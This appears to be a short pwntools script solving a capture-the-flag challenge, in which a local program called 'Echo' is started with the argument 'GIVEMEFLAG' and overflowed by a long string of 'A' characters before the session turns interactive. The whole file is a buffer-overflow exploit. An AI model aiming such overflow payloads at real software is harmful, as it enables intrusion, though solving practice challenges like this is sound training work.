from pwn import *

p = process(["./Echo", "GIVEMEFLAG"])
p.sendline("A" * 1971)
p.interactive()
